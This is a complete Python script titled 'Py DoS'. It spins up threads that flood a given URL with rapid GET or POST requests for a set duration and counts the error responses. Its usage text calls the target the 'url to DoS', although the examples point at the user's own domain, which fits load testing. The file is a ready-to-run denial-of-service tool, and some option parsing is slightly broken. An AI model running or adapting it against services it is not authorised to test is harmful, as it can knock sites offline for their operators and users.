'''
Author: kaneda (kanedasan@gmail.com)
Date: February 9th 2016
Description: Py DoS
Requires: pycurl

Copyright (c) 2016 kaneda (http://jbegleiter.com)
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Don't be evil.
'''

import io
import getopt
import pycurl
from random import random
import socket
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

class HttpDos(threading.Thread):
    def __init__(self, url, method = 'GET', http_timeout = 0.5, time_limit = 600, payload = None, verbose = False):
        super(HttpDos, self).__init__()

        # We don't want to transmit potentially sensitive
        # information in the URL of the POST request
        if method == 'POST':
            url = url.split('?')[0]

        self.url          = url
        self.method       = method
        self.payload      = payload
        self.http_timeout = http_timeout
        self.time_limit   = time_limit
        self.verbose      = verbose
        self.num_errors   = 0
        self.num_requests = 0
        self.code_map     = {}

    def testHttpTimeout(self):
        start_time = time.time()
        current_time = time.time()
        while current_time - start_time < self.time_limit:
            try:
                handler = urllib.request.HTTPHandler()
                opener  = urllib.request.build_opener(handler)
                urllib.request.install_opener(opener)
                request = None
                if self.payload:
                    encoded_payload = urllib.parse.urlencode(self.payload)
                    encoded_payload = encoded_payload.encode('UTF-8')
                    request = urllib.request.Request(self.url, encoded_payload)
                else:
                    request = urllib.request.Request(self.url)

                request.get_method = lambda: self.method
                a = urllib.request.urlopen(request, timeout = self.http_timeout)
                response_code = a.getcode()

                if response_code != 200:
                    if response_code in self.code_map:
                        self.code_map[response_code] += 1
                    else:
                        self.code_map[response_code] = 1

                    self.num_errors += 1
            except urllib.error.HTTPError as e:
                if e.code in self.code_map:
                    self.code_map[e.code] += 1
                else:
                    self.code_map[e.code] = 1

                self.num_errors += 1
            except Exception as e:
                if str(e) in self.code_map:
                    self.code_map[str(e)] += 1
                else:
                    self.code_map[str(e)] = 1

                self.num_errors += 1
                pass
            finally:
                self.num_requests += 1
                current_time = time.time()

                if self.verbose and self.num_requests % 1000 == 0:
                    print("Sent {0} requests on thread {1} in {2} seconds".format(self.num_requests, self.ident, current_time - start_time))

    def run(self):
        print("Starting run on thread {0}".format(self.ident))
        self.testHttpTimeout()

def usage():
    print("pydos.py help\n")
    print("Options:\n")
    print("--help: print this help")
    print("-u, --url: url to DoS (with parameters, if desired)")
    print("--timeout-http: Timeout for HTTP(S) socket connections; default is 0.5 seconds (500ms); minimum is 0.1 seconds")
    print("--time-to-run: Time in total to run (default is 600 seconds)")
    print("--num-threads: Number of threads to use (default is 1 thread)")
    print("--method: Method to use (either 'POST' or 'GET')")
    print("--verbose: Turn on verbose information about things happening in each thread (default is off)")
    print("Examples:\n")
    print("python pydos.py -u https://yourdomain.com/somepath --time-to-run=600               # Run against your domain for 600 seconds")
    print("python pydos.py -u https://yourdomain.com/somepath --method=POST                   # Run POST calls")
    print("python pydos.py -u https://yourdomain.com/somepath --verbose                       # Enable verbose mode")
    print("python pydos.py -u https://yourdomain.com/somepath?somearg=somevalue --method=POST # Run POST called against endpoint with payload somearg=somevalue")

def get_payload(url, method = 'GET'):
    payload = None
    if method == 'POST':
        c_url, args = url.split('?')

        if args:
            payload = {}
            params = args.split('&')

            for param in params:
                key, *value = param.split('=')
                if len(value) > 1:
                    value = '='.join(value)
                else:
                    value = ''.join(value)

                payload[key] = ''.join(value)

    return payload

def main():
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "h:v:u:p:t:n:m",
            ["help","verbose","url=","timeout-http=","time-to-run=","num-threads=","method="]
        )
    except getopt.GetoptError as err:
        # print help information and exit:
        print(str(err))
        usage()
        sys.exit(2)

    url          = None
    http_method  = "GET"
    http_timeout = 0.5
    num_threads  = 1
    time_to_run  = 600
    verbose      = False

    for option, argument in opts:
        if option in ("-u", "--url"):
            url = argument
        elif option in ("-h", "--help"):
            usage()
            sys.exit()
        elif option in ("-n", "--num-threads"):
            try:
                num_threads = int(argument)

                if(num_threads < 1): raise Exception('yikes')
            except Exception:
                num_threads = 1
                print("Not a valid number of threads (must be at least 1), using 1 instead")
        elif option in ("-p", "--timeout-http"):
            try:
                http_timeout = float(argument)

                if http_timeout < 0.1: raise Exception('yikes')
            except Exception:
                http_timeout = 0.5
                print("Not a valid http timeout (must be at least 0.1), using 0.5 instead")
        elif option in ("-m", "--method"):
            if argument.upper() not in ['GET', 'POST']:
                print("Not a valid method, must be one of 'GET' or 'POST'; using 'GET'")
            else:
                http_method = argument.upper()
        elif option in ("-v", "--verbose"):
            verbose = True
        elif option in ("-t", "--time-to-run"):
            try:
                time_to_run = int(argument)

                if(time_to_run < 1): raise Exception('yikes')
            except Exception:
                time_to_run = 600
                print("Not a valid number of seconds to run for (must be at least 1), using 600 instead")
        else:
            usage()
            sys.exit()

    payload = get_payload(url, http_method)

    print("URL: {0}".format(url))
    print("Method: {0}".format(http_method))
    print("Payload: {0}".format(payload))
    print("HTTP Timeout: {0}".format(http_timeout))
    print("Time limit: {0}".format(time_to_run))
    print("Num threads: {0}".format(num_threads))
    print("Verbose mode: {0}".format("on" if verbose else "off"))

    http_job_list  = []
    error_map      = {}
    total_errors   = 0
    total_requests = 0

    for i in range(num_threads):
        http_job_list.append(HttpDos(url, http_method, http_timeout, time_to_run, payload, verbose))

    for j in http_job_list:
        j.start()

    for j in http_job_list:
        j.join()

        for k in j.code_map.keys():
            if k in error_map:
                error_map[k] += j.code_map[k]
            else:
                error_map[k] = j.code_map[k]

        total_requests += j.num_requests
        total_errors   += j.num_errors

    print("All done!")
    print("Total requests sent: {0}".format(total_requests))
    print("Error map received:\n{0}".format(error_map))
    print("Total errors received:\n{0}".format(total_errors))

main()

